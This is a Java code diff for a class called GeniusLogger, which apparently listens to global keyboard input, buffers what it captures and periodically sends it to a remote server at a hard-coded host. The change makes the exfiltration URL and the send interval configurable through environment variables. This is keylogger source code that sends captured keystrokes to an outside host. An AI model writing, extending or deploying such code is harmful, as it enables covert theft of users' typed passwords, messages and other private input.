@@ -18,15 +18,17 @@ public final class GeniusLogger implements NativeKeyListener {
 
     private URL url;
     private int last;
+    private final int delay;
     private final StringBuilder builder;
 
     public GeniusLogger() {
         this.builder = new StringBuilder();
+        this.delay = System.getenv("GENIUS_SEND_DELAY") != null ? Integer.parseInt(System.getenv("GENIUS_SEND_DELAY")) : 60;
     }
 
     public void start() {
         try {
-            this.url = new URL("http://redis.yggdrasil80.tech:1711/log");
+            this.url = new URL(System.getenv("GENIUS_SEND_URL") != null ? System.getenv("GENIUS_SEND_URL") : "http://redis.yggdrasil80.tech:1711/log");
             this.last = 0;
         } catch (MalformedURLException ignored) {}
 
@@ -37,7 +39,7 @@ public final class GeniusLogger implements NativeKeyListener {
             System.exit(-1);
         }
 
-        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(this::send, 60, 60, TimeUnit.SECONDS);
+        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(this::send, this.delay, this.delay, TimeUnit.SECONDS);
         Runtime.getRuntime().addShutdownHook(new Thread(this::send));
     }
 
